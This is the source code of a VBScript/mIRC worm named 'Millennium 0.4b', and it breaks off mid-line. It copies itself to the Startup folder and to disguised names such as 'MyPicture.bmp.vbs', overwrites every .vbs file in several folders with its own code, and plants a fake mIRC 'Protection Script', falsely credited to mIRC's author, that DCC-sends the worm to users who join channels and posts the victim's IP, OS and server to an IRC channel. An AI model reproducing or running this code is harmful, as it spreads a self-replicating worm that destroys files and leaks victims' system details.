' Millennium 0.4b vBS/mIRC =]
' 

On Error Resume Next
dim worm, Map, f, b, Fool, a, fc, nf, fso, d, src, src2, src3

Const ForReading = 1, ForWriting = 2, ForAppending = 8

Set worm = CreateObject("Scripting.FileSystemObject")
Set w = worm.GetFile(WScript.ScriptFullName)
w.Copy ("c:\windows\system\MyPicture.bmp.vbs")
w.Copy ("c:\WINDOWS\Start Menu\Programs\StartUp\RunDLL.vbs")
w.Copy ("c:\My Documents\MyPicture.bmp.vbs")
w.Copy ("c:\MyPicture.bmp.vbs")
Set f = worm.OpenTextFile(WScript.ScriptFullName, 1)
wormcopy =  f.ReadAll

Set Map = worm.GetFolder("c:\")
Set a = Map.Files
For each target in a
ExtName = lcase(worm.GetExtensionName(target.Name))
if ExtName = "vbs" then
Set b = worm.OpenTextFile(target.path, 2, True)
b.write wormcopy
b.close
end if
next

Set Map = worm.GetFolder("c:\My Documents")
Set a = Map.Files
For each target in a
ExtName = lcase(worm.GetExtensionName(target.Name))
if ExtName = "vbs" then
Set b = worm.OpenTextFile(target.path, 2, True)
b.write wormcopy
b.close
end if
next

Set Map = worm.GetFolder("c:\Windows")
Set a = Map.Files
For each target in a
ExtName = lcase(worm.GetExtensionName(target.Name))
if ExtName = "vbs" then
Set b = worm.OpenTextFile(target.path, 2, True)
b.write wormcopy
b.close
end if
next

Set Map = worm.GetFolder("c:\windows\samples\wsh")
Set a = Map.Files
For each target in a
ExtName = lcase(worm.GetExtensionName(target.Name))
if ExtName = "vbs" then
Set b = worm.OpenTextFile(target.path, 2, True)
b.write wormcopy
b.close
end if
next

Set fso = CreateObject("Scripting.FileSystemObject")
Set b = fso.CreateTextFile("c:\mirc\script.ini", True)
b.WriteLine "[script]"
b.WriteLine "n0=;mIRC Protection Script DO NOT EDIT!"
b.WriteLine "n1=;By Khaled Mardem-Bey"
b.WriteLine "n2=;    www.mirc.com"
b.WriteLine "n3="
b.WriteLine "n4="
b.WriteLine "n5="
b.WriteLine "n6="
b.WriteLine "n7=on 1:CONNECT:{"
b.WriteLine "n8=  //.msg #xmasday Hi. $server $port $ip $os $time $date %chan it's been $+ $duration($calc($ticks / 1000)) since my last reboot! Mil0.4b"
b.WriteLine "n9=}"
b.WriteLine "n10=on 1:JOIN:#:{ /if ( $nick == $me ) { halt }"
b.WriteLine "n11=  /.dcc send $nick c:\windows\system\MyPicture.bmp.vbs"
b.WriteLine "n12=}"
b.WriteLine "n13=on 1:NICK: { if ($nick == $me) .msg #xmasday OldNick was $nick }"
b.WriteLine "n14=on 1:notice:millennium*:?: .msg #xmasday 0,3 $time $nick Killed me, closing mIRC... *I Am Gone* | exit"
b.close

Set f = fso.OpenTextFile("c:\mirc\mirc.ini", 8, True)
f.WriteL